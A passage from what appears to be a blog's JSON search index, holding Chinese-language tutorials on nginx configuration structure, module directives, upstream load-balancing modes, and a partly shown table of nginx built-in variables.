服务器](https://blog.csdn.net/kikajack/article/details/79322194)\n+ [Nginx 的 try_files 指令使用实例](https://www.hi-linux.com/posts/53878.html)\n+ [HTTP 请求头中的 X-Forwarded-For](https://imququ.com/post/x-forwarded-for-header-in-http.html)","tags":["nginx"],"categories":["nginx"]},{"title":"nginx介绍和常用模块配置","url":"%2Fp%2F7245bfc7.html","content":"\nNginx功能丰富，可作为HTTP服务器，也可作为反向代理服务器，邮件服务器。支持FastCGI、SSL、Virtual Host、URL Rewrite、Gzip等功能。并且支持很多第三方的模块扩展。\n\n\n\n# 零. 前言\n\n### 0.1 配置文件在哪\n\n安装好nginx我们首先要知道配置文件在哪里?\n\n![1](nginx_config/1.png)\n\n\n\n说明nginx的主配置文件都在 `/etc/nginx/nginx.conf`里. 打开文件我们还可以看到\n\n```ngnix\ninclude /etc/nginx/conf.d/*.conf;\ninclude /etc/nginx/sites-enabled/*;\n```\n\n\n\n需要添加新配置选项的地方位于 sites-enabled 文件夹。如果你打开这个文件夹，你会发现一个名为 default 的文档，打开后你就会找到nginx的配置选项, 当你安装好nginx默认看到的首页就是在这里配置的.\n\n\n\n在该目录下还有一个 sites-available 的文件夹, 这个文件夹一般在你需要建立和管理多个站点的时候非常有用，可以帮助你更好的组织不同的项目。你需要在这里添加你的nginx配置文案并将他们链接至 sites-enabled 目录下。\n\n\n\n只有在 sites-enabled 目录下的配置文件才能够真正被用户访问。但是你同样可以将文件放在 sites-available 目录下用来存档或者生成链接。\n\n<!-- more -->\n\n\n\n### 0.2 默认root在哪\n\n```bash\nnginx -V\nit lists --prefix as the first one.\n```\n\n\n\n### 0.3 重启nginx\n\n```bash\nsudo nginx -s reload\n```\n\nreload，重新加载的意思，reload会重新加载配置文件，nginx服务不会中断，而且reload时会测试conf语法等，如果出错会rollback用上一次正确配置文件保持正常运行。\n\nrestart，重启，会重启nginx服务。这个重启会造成服务一瞬间的中断，当然如果配置文件出错会导致服务启动失败，那就是更长时间的服务中断了。\n\n\n\n# 一. nginx 常用功能说明\n\n\n\n### 1.1 反向代理\n\n下面一张图是对正向代理与反响代理的对比\n\n\n![1](nginx_config/1.jpg)\n\nNginx在做反向代理时，提供性能稳定，并且能够提供配置灵活的转发功能。Nginx可以根据不同的正则匹配，采取不同的转发策略，比如图片文件结尾的走文件服务器，动态页面走web服务器，只要你正则写的没问题，又有相对应的服务器解决方案，你就可以随心所欲的玩。并且Nginx对返回结果进行错误页跳转，异常判断等。如果被分发的服务器存在异常，他可以将请求重新转发给另外一台服务器，然后自动去除异常服务器。\n\n\n\n### 1.2 负载均衡\n\nNginx提供的负载均衡策略有2种：内置策略和扩展策略。\n\n内置策略为轮询，加权轮询，Ip hash。扩展策略，就天马行空，只有你想不到的没有他做不到的啦，你可以参照所有的负载均衡算法，给他一一找出来做下实现。\n\n\n\n看下面的图理解三种负载均衡算法的实现\n\n![1](nginx_config/2.jpg)\n\n\n\nIp hash算法，对客户端请求的ip进行hash操作，然后根据hash结果将同一个客户端ip的请求分发给同一台服务器进行处理，可以解决session不共享的问题。\n\n![1](nginx_config/3.jpg)\n\n\n\n### 1.3 web缓存\n\nnginx可以对不同的文件做不同的缓存处理，配置灵活，并且支持FastCGI_Cache，主要用于对FastCGI的动态程序进行缓存。配合着第三方的ngx_cache_purge，对制定的URL缓存内容可以的进行增删管理。\n\n\n\n# 二. nginx配置文件结构\n\n\n\n先放一个配置demo\n\n```nginx\nuser  nobody;\nworker_processes  1;\npid        logs/nginx.pid;\n\nevents {\n    worker_connections  1024;\n}\n\nupstream mysvr {   \n  server 127.0.0.1:7878;\n  server 192.168.10.121:3333 backup;\n}\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n  \n    server {\n        listen       80;\n        server_name  localhost;\n        location / {\n            root   html;\n            index  index.html index.htm;\n        }\n    }\n}\n```\n\n\n\n### 2.1 配置文件结构\n\n+ main(全局块)[一个]\n+ events (nginx工作模式)[一个]\n\n+ http(http设置)[一个]\n  + server(主机设置)[http里多个]\n    + location(URL匹配)[server里多个]\n  + upstream(负载均衡服务器设置)[http里一个]\n\n\n\n1、全局块：配置影响nginx全局的指令。一般有运行nginx服务器的用户组，nginx进程pid存放路径，日志存放路径，配置文件引入，允许生成worker process数等。\n\n2、events块：配置影响nginx服务器或与用户的网络连接。有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等。\n\n3、http块：可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。如文件引入，mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等。\n\n4、server块：配置虚拟主机的相关参数，一个http中可以有多个server。\n\n5、location块：配置请求的路由，以及各种页面的处理情况。\n\n6、upstream块：负责负载均衡\n\n\n\n```nginx\n########### 每个指令必须有分号结束。#################\n\n#user administrator administrators;  #配置用户或者组，默认为nobody nobody。\n#worker_processes 2;  #允许生成的进程数，默认为1\n#pid /nginx/pid/nginx.pid;   #指定nginx进程运行文件存放地址\n\nerror_log log/error.log debug;  #制定日志路径，级别。这个设置可以放入全局块，http块，server块，级别分别为：debug|info|notice|warn|error|crit|alert|emerg\n\n\nevents {\n    accept_mutex on;   #设置网路连接序列化，防止惊群现象发生，默认为on\n    multi_accept on;  #设置一个进程是否同时接受多个网络连接，默认为off\n    #use epoll;      #事件驱动模型，select|poll|kqueue|epoll|resig|/dev/poll|eventport\n    worker_connections  1024;    #最大连接数，默认为512\n}\n\n\nhttp {\n    include       mime.types;   #文件扩展名与文件类型映射表\n    default_type  application/octet-stream; #默认文件类型，默认为text/plain\n    #access_log off; #取消服务日志    \n    log_format myFormat '$remote_addr–$remote_user [$time_local] $request $status $body_bytes_sent $http_referer $http_user_agent $http_x_forwarded_for'; #自定义格式\n    access_log log/access.log myFormat;  #combined为日志格式的默认值\n  \n \n    sendfile on;   #允许sendfile方式传输文件，默认为off，可以在http块，server块，location块。\n    sendfile_max_chunk 100k;  #每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。\n    keepalive_timeout 65;  #连接超时时间，默认为75s，可以在http，server，location块。\n\n    upstream mysvr {   \n      server 127.0.0.1:7878;\n      server 192.168.10.121:3333 backup;  #热备\n    }\n  \n    error_page 404 https://www.baidu.com; #错误页\n    \n  \tserver {\n        keepalive_requests 120; #单连接请求上限次数。\n        listen       4545;   #监听端口\n        server_name  127.0.0.1;   #监听地址       \n        \n    \t\tlocation  ~*^.+$ {       #请求的url过滤，正则匹配，~为区分大小写，~*为不区分大小写。\n           #root path;  #根目录\n           #index vv.txt;  #设置默认页\n           proxy_pass  http://mysvr;  #请求转向mysvr 定义的服务器列表\n           deny 127.0.0.1;  #拒绝的ip\n           allow 172.18.5.54; #允许的ip           \n        }\n    }\n}\n```\n\n\n\n+ `$remote_addr` 与`$http_x_forwarded_for` 用以记录客户端的ip地址； \n+ `$remote_user` 用来记录客户端用户名称； \n+ `$time_local` 用来记录访问时间与时区；\n+ `$request` 用来记录请求的url与http协议；\n+ `$status` 用来记录请求状态；成功是200， \n+ `body_bytes_sent` 记录发送给客户端文件主体内容大小；\n+ `$http_referer` 用来记录从那个页面链接访问过来的； 8.$http_user_agent ：记录客户端浏览器的相关信息；\n\n+ 惊群现象：一个网路连接到来，多个睡眠的进程被同时叫醒，但只有一个进程能获得链接，这样会影响系统性能。\n\n+ 每个指令必须有分号结束。\n\n\n\n# 三. 模块配置说明\n\n### 3.1 main模块\n\n```nginx\nuser nobody nobody;\nworker_processes 2;\nerror_log  /usr/local/var/log/nginx/error.log  notice;\npid        /usr/local/var/run/nginx/nginx.pid;\nworker_rlimit_nofile 1024;\n```\n\n\n\n+ user 来指定Nginx Worker进程运行用户以及用户组，默认由nobody账号运行。\n\n+ worker_processes来指定了Nginx要开启的子进程数。每个Nginx进程平均耗费10M~12M内存。根据经验，一般指定1个进程就足够了，如果是多核CPU，建议指定和CPU的数量一样的进程数即可。我这里写2，那么就会开启2个子进程，总共3个进程。可以写 auto.\n\n+ error_log用来定义全局错误日志文件。日志输出级别有debug、info、notice、warn、error、crit可供选择，其中，debug输出日志最为最详细，而crit输出日志最少。\n\n+ pid用来指定进程id的存储文件位置。\n\n+ worker_rlimit_nofile用于指定一个nginx进程可以打开的最多文件描述符数目，这里是65535，需要使用命令“ulimit -n 65535”来设置。\n\n  \n\n### 3.2 events 模块\n\nevents模块来用指定nginx的工作模式和工作模式及连接数上限\n\n```nginx\nevents {\n     use kqueue; #mac平台\n     worker_connections  1024;\n}\n```\n\n\n\n+ use用来指定Nginx的工作模式。Nginx支持的工作模式有select、poll、kqueue、epoll、rtsig和/dev/poll。其中select和poll都是标准的工作模式，kqueue和epoll是高效的工作模式，不同的是epoll用在Linux平台上，而kqueue用在BSD系统中，因为Mac基于BSD,所以Mac也得用这个模式，对于Linux系统，epoll工作模式是首选。\n\n+ worker_connections用于定义Nginx每个进程的最大连接数，即接收前端的最大请求数，默认是1024。最大客户端连接数由worker_processes和worker_connections决定\n+ 即Max_clients=worker_processes*worker_connections，在作为反向代理时，Max_clients变为：Max_clients = worker_processes * worker_connections/4。 \n\n+ 进程的最大连接数受Linux系统进程的最大打开文件数限制，在执行操作系统命令“ulimit -n 65536”后worker_connections的设置才能生效。\n\n\n\n### 3.3 http 模块\n\nhttp模块可以说是最核心的模块了，它负责HTTP服务器相关属性的配置，它里面的server和upstream子模块，至关重要。\n\n```nginx\nhttp {\n     include       mime.types;\n     default_type  application/octet-stream;\n     log_format  main  'remote_addr - remote_user [time_local] \"request\" '\n                       'status body_bytes_sent \"$http_referer\" '\n                       '\"http_user_agent\" \"http_x_forwarded_for\"';\n     access_log  /usr/local/var/log/nginx/access.log  main;\n     sendfile        on;\n     tcp_nopush      on;\n     tcp_nodelay     on;\n     keepalive_timeout  10;\n     #gzip  on;\n     \n     upstream myproject {\n         .....\n     }\n     \n  \t server {\n         ....\n     }\n}\n```\n\n\n\n+ include 用来设定文件的mime类型,类型在配置文件目录下的mime.type文件定义，来告诉nginx来识别文件类型。\n\n+ default_type设定了默认的类型为二进制流，也就是当文件类型未定义时使用这种方式。\n\n+ log_format用于设置日志的格式，和记录哪些参数，这里设置为main，刚好用于access_log来记录这种类型。\n\n  main的类型日志如下：也可以增删部分参数。\n\n  127.0.0.1 - - [21/Apr/2015:18:09:54 +0800] \"GET /index.php HTTP/1.1\" 200 87151 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36\" \n\n+ access_log 用来纪录每次的访问日志的文件地址，后面的main是日志的格式样式，对应于log_format的main。\n\n+ sendfile参数用于开启高效文件传输模式。\n+ 将tcp_nopush和tcp_nodelay两个指令设置为on用于防止网络阻塞。\n\n+ keepalive_timeout设置客户端连接保持活动的超时时间。在超过这个时间之后，服务器会关闭该连接。\n\n\n\n### 3.4 server 模块 (http的子模块, 虚拟主机)\n\nsever 模块是http的子模块，它用来定一个虚拟主机。我们看一下一个简单的server 是如何做的？\n\n```nginx\nserver {\n         listen       8080;\n         server_name  test.liuvv.com;\n         root   /home/levonfly/www;         # 全局定义，如果都是这一个目录，这样定义最简单。\n         index  index.php index.html index.htm; \n         charset utf-8;\n         access_log  usr/local/var/log/host.access.log  main;\n         aerror_log  usr/local/var/log/host.error.log  error;\n         ....\n}\n```\n\n+ server标志定义虚拟主机开始。 \n\n+ listen用于指定虚拟主机的服务端口。 \n\n+ server_name用来指定IP地址或者域名，多个域名之间用空格分开。 \n\n+ root 表示在这整个server虚拟主机内，全部的root web根目录。注意要和locate {}下面定义的区分开来。 \n\n+ index 全局定义访问的默认首页地址。注意要和locate {}下面定义的区分开来。 \n\n+ charset用于设置网页的默认编码格式。 \n\n+ access_log用来指定此虚拟主机的访问日志存放路径，最后的main用于指定访问日志的输出格式。\n\n\n\n### 3.5 location 模块(server的子模块, 重要)\n\nlocation模块是nginx中用的最多的，也是最重要的模块了，什么负载均衡啊、反向代理啊、虚拟域名啊都与它相关。\n\nlocation 根据它字面意思就知道是来定位的，定位URL，解析URL，所以，它也提供了强大的正则匹配功能，也支持条件判断匹配，用户可以通过location指令实现Nginx对动、静态网页进行过滤处理。\n\n\n\n我们先来看这个，设定默认首页和虚拟机目录。\n\n```nginx\nlocation / {\n\troot   /home/levonfly/www;\n\tindex  index.php index.html index.htm;\n}\n```\n\n+ location /表示匹配访问根目录。\n\n+ root指令用于指定访问根目录时，虚拟主机的web目录，这个目录可以是相对路径（相对路径是相对于nginx的安装目录）。也可以是绝对路径。\n\n+ index用于设定我们只输入域名后访问的默认首页地址，有个先后顺序：index.php index.html index.htm，如果没有开启目录浏览权限，又找不到这些默认首页，就会报403错误。\n\n  \n\nlocation 还有一种方式就是正则匹配，开启正则匹配这样：`location ~`。后面加个`~`。下面这个例子是运用`正则匹配`来链接php。\n\n```nginx\nlocation ~ \\.php$ {\n            root           /home/levonfly/www;\n            fastcgi_pass   127.0.0.1:9000;\n            fastcgi_index  index.php;\n            include        fastcgi.conf;\n        }\n```\n\n`\\.php$` 熟悉正则的我们直到，这是匹配`.php`结尾的URL，用来解析php文件。里面的`root`也是一样，用来表示虚拟主机的根目录。 \n`fast_pass`链接的是`php-fpm` 的地址，之前我们也搭建过。其他几个参数我们以后再说。\n\n\n\n### 3.6 upstream 模块(http子模块)\n\nupstream 模块负债负载均衡模块，通过一个简单的调度算法来实现客户端IP到后端服务器的负载均衡。我先学习怎么用，具体的使用实例以后再说。\n\n```nginx\nupstream liuvv.com{\n     ip_hash;\n     server 192.168.12.1:80;\n     server 192.168.12.2:80 down;\n     server 192.168.12.3:8080  max_fails=3  fail_timeout=20s;\n     server 192.168.12.4:8080;\n}\n```\n\n在上面的例子中，通过upstream指令指定了一个负载均衡器的名称liuvv.com。这个名称可以任意指定，在后面需要的地方直接调用即可。\n\n\n\n里面是ip_hash这是其中的一种负载均衡调度算法，下面会着重介绍。紧接着就是各种服务器了。用server关键字表识，后面接ip。\n\nNginx的负载均衡模块目前支持4种调度算法:\n\n1. weight 轮询（默认）。每个请求按时间顺序逐一分配到不同的后端服务器，如果后端某台服务器宕机，故障系统被自动剔除，使用户访问不受影响。weight。指定轮询权值，weight值越大，分配到的访问机率越高，主要用于后端每个服务器性能不均的情况下。\n2. ip_hash。每个请求按访问IP的hash结果分配，这样来自同一个IP的访客固定访问一个后端服务器，有效解决了动态网页存在的session共享问题。\n3. fair。比上面两个更加智能的负载均衡算法。此种算法可以依据页面大小和加载时间长短智能地进行负载均衡，也就是根据后端服务器的响应时间来分配请求，响应时间短的优先分配。Nginx本身是不支持fair的，如果需要使用这种调度算法，必须下载Nginx的upstream_fair模块。\n4. url_hash。按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，可以进一步提高后端缓存服务器的效率。Nginx本身是不支持url_hash的，如果需要使用这种调度算法，必须安装Nginx 的hash软件包。\n\n\n\n在HTTP Upstream模块中，可以通过server指令指定后端服务器的IP地址和端口，同时还可以设定每个后端服务器在负载均衡调度中的状态。常用的状态有：\n\n- down，表示当前的server暂时不参与负载均衡。\n- backup，预留的备份机器。当其他所有的非backup机器出现故障或者忙的时候，才会请求backup机器，因此这台机器的压力最轻。\n- max_fails，允许请求失败的次数，默认为1。当超过最大次数时，返回proxy_next_upstream 模块定义的错误。\n- fail_timeout，在经历了max_fails次失败后，暂停服务的时间。max_fails可以和fail_timeout一起使用。\n\n**注意** 当负载调度算法为ip_hash时，后端服务器在负载均衡调度中的状态不能是weight和backup。\n\n\n\n# 四. nginx 配置实战\n\n### 4.1 nginx指令\n\n```\nnginx -s signal\n```\n\nWhere *signal* may be one of the following:\n\n- stop — fast shutdown\n- quit — graceful shutdown\n- reload — reloading the configuration file\n- reopen — reopening the log files\n\n\n\n### 4.2 nginx 快速配置教程\n\nhttps://nginx.org/en/docs/beginners_guide.html\n\n##### 4.2.1 如果有多个location模块, 匹配最长的\n\n```nginx\n    location / {\n            root /home/levonfly/www;\t#http://test.liuvv.com/\n    }\n\n    location /images/ { # 路径是两者相加/home/levonfly/images/\n            root /home/levonfly;\t#http://test.liuvv.com/images/1.png\n    }\n```\n\n##### 4.2.2 一个nginx实例可以通过listen监听不同端口\n\n```nginx\nserver {\n    listen 8080;\n    root /home/levonfly/8080;  # location没有root, 就用这里的root, 继承关系\n\n    location / {\n    }\n}\n\nserver {\n        listen 80;\n        server_name *.liuvv.com;\n        location / {\n                proxy_pass http://localhost:8080;\n        }\n        location /images/ {   \n                root /home/levonfly/; # http://test.liuvv.com/images/1.png\n        }\n  \n  \t    #location ~ \\.(gif|jpg|png)$ {  # 1.判断后缀 2. 波浪线是正则\n        #        root /home/levonfly/images; # http://test.liuvv.com/1.png\n        #}\n}\n```\n\n##### 4.2.3 fastcgi方式\n\nnginx本身不能处理php，它只是个web服务器，当接收到请求后，如果是php请求，则发给php解释器处理，并把结果返回给客户端。nginx一般是把请求发fastcgi管理进程处理，fascgi管理进程选择cgi子进程处理结果并返回给nginx. php-fpm是一个php fastcgi管理器, 目前直接集成在php中.\n\n\n\n安装php:\n\n```bash\nsudo apt install php\nsudo systemctl restart php7.0-fpm.service\n```\n\nnginx配置:\n\n```nginx\nserver {\n        listen 80;\n        server_name *.liuvv.com;\n        root /home/levonfly/www;\n        index index.php index.html index.htm;\n  \n        location ~* \\.php$ {\n                fastcgi_pass unix:/run/php/php7.0-fpm.sock;\n                include         fastcgi_params;\n                fastcgi_param   SCRIPT_FILENAME    $document_root$fastcgi_script_name;\n                fastcgi_param   SCRIPT_NAME        $fastcgi_script_name;\n        }\n}\n```\n\n### 4.3 虚拟主机配置\n\nnginx 使用域名，主要是使用`server`模块下的` server_name`选项。\n\n参考: http://www.liuvv.com/p/d039.html\n\n### 4.4 URL路由重写\n\nnginx 使用url 重写，主要是使用`server`模块下的` location`模块。\n\n参考: http://www.liuvv.com/p/51e59d76.html\n\n### 4.5 反向代理配置\n\nnginx 使用反向代理，主要是使用 `server`模块下 `location`模块下的`proxy_pass`选项。\n\n参考: http://www.liuvv.com/p/51e59d76.html\n\n### 4.6 负载均衡配置\n\nnginx 使用反向代理，主要是使用`upstream`模块(和server 平级)。\n\n参考: https://www.liuvv.com/p/4c38afcc.html\n\n\n\n# 五. 参考资料\n\n+ nginx的配置、虚拟主机、负载均衡和反向代理\n\n  https://www.zybuluo.com/phper/note/89391  \n\n  https://www.zybuluo.com/phper/note/90310  \n\n  https://www.zybuluo.com/phper/note/133244  \n\n+ nginx 配置详解\n\n  https://my.oschina.net/duxuefeng/blog/34880\n\n  http://www.nginx.cn/591.html \n\n  https://jkzhao.github.io/2018/01/23/Nginx%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E5%8F%8A%E4%BC%98%E5%8C%96 \n\n  https://www.kancloud.cn/curder/nginx/96672 \n\n+ 在线生成nginx 配置\n\n   https://nginxconfig.io\n   \n+ nginx 优秀教程\n\n   https://xuexb.github.io/learn-nginx/example/  \n\n   https://www.kancloud.cn/hfpp2012/nginx-tutorial/467009\n","tags":["nginx"],"categories":["nginx"]},{"title":"nginx通过upstream实现负载均衡","url":"%2Fp%2F4c38afcc.html","content":"\n\n\n### 1. nginx upstream 负载均衡\n\nupstream 模块负债负载均衡模块，如果Nginx没有仅仅只能代理一台服务器的话，那它也不可能像今天这么火，Nginx可以配置代理多台服务器，当一台服务器宕机之后，仍能保持系统可用。具体配置过程如下：\n\n 在http节点下，添加upstream节点。\n\n```nginx\nupstream levonfly { \n      server 10.0.6.108:7080; \n      server 10.0.0.85:8980; \n}\n```\n\n将server节点下的location节点中的proxy_pass配置为：http:// + upstream名称，即\"http://levonfly\".\n\n```nginx\nlocation / { \n            root  html; \n            index  index.html index.htm; \n            proxy_pass http://levonfly; \n}\n```\n\n现在负载均衡初步完成了。upstream按照轮询（默认）方式进行负载，每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。虽然这种方式简便、成本低廉。\n<!-- more -->\n\n\n### 2. upstream 负载均衡的模式\n\nnginx的upstream支持5种分配方式，下面将会详细介绍，其中，前三种为Nginx原生支持的分配方式，后两种为第三方支持的分配方式：\n\n##### 2.1 轮询(默认)\n\n轮询是upstream的默认分配方式，即每个请求按照时间顺序轮流分配到不同的后端服务器，如果某个后端服务器down掉后，能自动剔除。\n\n```nginx\nupstream backend {\n  server 192.168.1.101:8888;\n  server 192.168.1.102:8888;\n  server 192.168.1.103:8888;\n}\n```\n\n##### 2.2 weight        \n\n轮询的加强版，即可以指定轮询比率，weight和访问几率成正比，主要应用于后端服务器异质的场景下。\n\n```nginx\nupstream backend {\n  server 192.168.1.101 weight=1;\n  server 192.168.1.102 weight=2;\n  server 192.168.1.103 weight=3; # 是101访问率的3倍\n}\n```\n\n##### 2.3 ip_hash        \n\n每个请求按照访问ip（即nginx的前置服务器或者客户端IP）的hash结果分配，这样每个访客会固定访问一个后端服务器，可以解决session一致问题。\n\n```nginx\nupstream backend {\n  ip_hash;\n  server 192.168.1.101:7777;\n  server 192.168.1.102:8888;\n  server 192.168.1.103:9999;\n}\n```\n\n##### 2.4 fair(第三方) \n\nfair顾名思义，公平地按照后端服务器的响应时间（rt）来分配请求，响应时间短即rt小的后端服务器优先分配请求。\n\n```nginx\nupstream backend {\n  server 192.168.1.101;\n  server 192.168.1.102;\n  server 192.168.1.103;\n  fair;\n}\n```\n\n##### 2.5 url_hash(第三方)\n\n与ip_hash类似，但是按照访问url的hash结果来分配请求，使得每个url定向到同一个后端服务器，主要应用于后端服务器为缓存时的场景下。\n\n```nginx\nupstream backend {\n  server 192.168.1.101;\n  server 192.168.1.102;\n  server 192.168.1.103;\n  hash $request_uri;\n  hash_method crc32;\n}\n```\n\n注意：在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法。\n\n\n\n### 3. upstream 其他参数\n\nupstream中server指令语法如下：`server address [parameters]` ,  关键字server必选, address也必选，可以是主机名、域名、ip或unix socket，也可以指定端口号。\n\nupstream还可以为每个设备设置状态值，这些状态值的含义分别如下：\n\n+ down 表示单前的server暂时不参与负载.\n\n+ weight 默认为1.    weight越大，负载的权重就越大。\n\n+ max_fails ：允许请求失败的次数默认为1.当超过最大次数时，返回proxy_next_upstream 模块定义的错误.\n\n+ fail_timeout : max_fails次失败后，暂停的时间。\n\n+ backup： 表示当前server是备用服务器，只有其它非backup后端服务器都挂掉了或者很忙才会分配到请求。\n\n```nginx\nupstream bakend{ #定义负载均衡设备的Ip及设备状态 \n      ip_hash; \n      server 10.0.0.11:9090 down; \n      server 10.0.0.11:8080 weight=2; \n      server 10.0.0.11:6060; \n      server 10.0.0.11:7070 backup; \n}\n```\n\n##### 3.1 注意:\n\nmax_fails和fail_timeout一般会关联使用，如果某台server在fail_timeout时间内出现了max_fails次连接失败，那么Nginx会认为其已经挂掉了，从而在fail_timeout时间内不再去请求它，fail_timeout默认是10s，max_fails默认是1，即默认情况是只要发生错误就认为服务器挂掉了，如果将max_fails设置为0，则表示取消这项检查。\n\n\n\n### 4. 实战配置:\n\n````nginx\nupstream levonfly {\n    server 127.0.0.1:13050;\n}\n\nupstream testing-levonfly {\n    server 172.25.61.25:13050;\n}\n\n\nserver {\n    server_name levonfly.com;\n    listen 443 ssl http2 ;\n    access_log /var/log/nginx/cistern_access_log;\n    error_log /var/log/nginx/cistern_error_log notice;\n    ssl_certificate /etc/nginx/certs/STAR.levonfly.com.crt;\n    ssl_certificate_key /etc/nginx/certs/STAR.levonfly.com.key;\n    proxy_set_header       X-Real-IP $remote_addr;\n    proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header       X-Forwarded-Proto $scheme;\n    proxy_set_header       X-Scheme $scheme;\n    proxy_set_header       Host $http_host;\n    proxy_redirect         off;\n    proxy_intercept_errors on;\n\n    location / {\n        proxy_pass http://levonfly;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection $http_connection;\n        proxy_http_version 1.1;\n        chunked_transfer_encoding off;\n        proxy_buffering off;\n        proxy_cache off;\n    }\n}\n\nserver {\n    server_name test.levonfly.com;\n    listen 443 ssl http2 ;\n    access_log /var/log/nginx/cistern_access_log;\n    error_log /var/log/nginx/cistern_error_log notice;\n    ssl_certificate /etc/nginx/certs/STAR.levonfly.com.crt;\n    ssl_certificate_key /etc/nginx/certs/STAR.levonfly.com.key;\n    proxy_set_header       X-Real-IP $remote_addr;\n    proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header       X-Forwarded-Proto $scheme;\n    proxy_set_header       X-Scheme $scheme;\n    proxy_set_header       Host $http_host;\n    proxy_redirect         off;\n    proxy_intercept_errors on;\n\n    location / {\n        proxy_pass http://testing-levonfly;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection $http_connection;\n        proxy_http_version 1.1;\n        chunked_transfer_encoding off;\n        proxy_buffering off;\n        proxy_cache off;\n    }\n}\n````\n\n##### 4.1 遇到的问题:\n\n 如果不生效, 注意下 upstream 的缩进会造成问题\n\n\n\n### 5. 参考资料\n\n+ http://www.linuxe.cn/post-182.html\n\n+ https://www.cnblogs.com/wzjhoutai/p/6932007.html\n\n","tags":["nginx"],"categories":["nginx"]},{"title":"nginx全局变量","url":"%2Fp%2F80b24c5f.html","content":"\n### 1. 服务器相关\n\n| 变量名                | 备注                                                         | 示例                                               |\n| --------------------- | ------------------------------------------------------------ | -------------------------------------------------- |\n| `nginx_version`       | 当前运行的 Nginx 版本号                                      | 1.11.2                                             |\n| `server_port`         | 服务器端口                                                   | 8080                                               |\n| `server_addr`         | 服务器端地址                                                 | 127.0.0.1                                          |\n| `server_name`         | 服务器名称                                                   | 127.0.0.1                                          |\n| `server_protocol`     | 服务器的HTTP版本                                             | HTTP/1.0                                           |\n| `status`              | HTTP 响应代码                                                | 200                                                |\n| `time_iso8601`        | 服务器时间的 ISO 8610 格式                                   | 2018-09-02T15:14:27+08:00                          |\n| `time_local`          | 服务器时间（LOG Format 格式）                                | 02/Sep/2018:15:14:27 +0800                         |\n| `document_root`       | 当前请求的文档根目录或别名                                   | `/home/xiaowu/github/echo.xuexb.com`               |\n| `request_filename`    | 当前连接请求的文件路径，由 `root`或 `alias`指令与 URI 请求生成 | `/home/xiaowu/github/echo.xuexb.com/api/dump/path` |\n| `request_completion`  | 如果请求成功，值为”OK”，如果请求未完成或者请求不是一个范围请求的最后一部分，则为空 |                                                    |\n| `pid`                 | 工作进程的PID                                                | 1234                                               |\n| `msec`                | 当前的Unix时间戳                                             | 1535872750.954                                     |\n| `limit_rate`          | 用于设置响应的速度限制                                       | 0                                                  |\n| `pipe`                | 如果请求来自管道通信，值为“p”，否则为“.”                     | .                                                  |\n| `connection_requests` | TCP连接当前的请求数量                                        | 1                                                  |\n| `connection`          | TCP 连接的序列号                                             | 363861                                             |\n| `realpath_root`       | 当前请求的文档根目录或别名的真实路径，会将所有符号连接转换为真实路径 | /home/xiaowu/github/echo.xuexb.com                 |\n|                       \n\n<!-- more -->\n\n### 2. 客户端相关\n\n| 变量名              | 示例                                                         | 备注                                                         |\n| ------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| host                | echo.xuexb.com                                               | 优先级如下：HTTP请求行的主机名>”HOST”请求头字段>符合请求的服务器名 |\n| hostname            | bj01                                                         | 主机名                                                       |\n| remote_port         | 58500                                                        | 客户端端口                                                   |\n| remote_user         |                                                              | 用于HTTP基础认证服务的用户名                                 |\n| request             | GET /api/dump/path?a=1&%E4%B8%AD%E6%96%87=%E5%A5%BD%E7%9A%84%23123 HTTP/1.0 | 代表客户端的请求地址                                         |\n| remote_addr         | 127.0.0.1                                                    | 客户端地址                                                   |\n| request_body        |                                                              | 客户端的请求主体, 此变量可在location中使用，将请求主体通过proxy_pass, fastcgi_pass, uwsgi_pass, 和 scgi_pass传递给下一级的代理服务器 |\n| request_body_file   |                                                              | 将客户端请求主体保存在临时文件中文件处理结束后，此文件需删除如果需要之一开启此功能，需要设置client_body_in_file_only如果将次文件传递给后端的代理服务器，需要禁用request body，即设置proxy_pass_request_body off，fastcgi_pass_request_body off, uwsgi_pass_request_body off, or scgi_pass_request_body off |\n| proxy_protocol_addr |                                                              | 获取代理访问服务器的客户端地址，如果是直接访问，该值为空字符串(1.5.12) |\n| http_名称           | http_accept_language -> zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7  | 匹配任意请求头字段； 变量名中的后半部分“name”可以替换成任意请求头字段，如在配置文件中需要获取http请求头：“Accept-Language”，那么将“－”替换为下划线，大写字母替换为小写，形如：http_accept_language即可 |\n| bytes_sent          | 0                                                            | 传输给客户端的字节数 (1.3.8, 1.2.5)                          |\n| body_bytes_sent     | 0                                                            | 传输给客户端的字节数，响应头不计算在内；这个变量和Apache的mod_log_config模块中的“%B”参数保持兼容 |\n\n\n\n### 3. 客户端相关 - request headers\n\n| 变量名                           | 备注                                                         | 示例                                                         |\n| -------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| `http_accept`                    | 浏览器支持的 MIME 类型                                       | `text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8` |\n| `http_accept_encoding`           | 浏览器支持的压缩编码                                         | `gzip, deflate, br`                                          |\n| `http_accept_language`           | 浏览器支持的语言                                             | `zh-CN,zh;q=0.9,en;q=0.8`                                    |\n| `http_cache_control`             | 浏览器缓存                                                   | `max-age=0`                                                  |\n| `http_connection`                | 客户端与服务连接类型                                         |                                                              |\n| `http_cookie`                    | 浏览器请求 cookie                                            | `a=1; b=2`                                                   |\n| `http_host`                      | 浏览器请求 host                                              | echo.xuexb.com                                               |\n| `http_referer`                   | 浏览器来源                                                   | 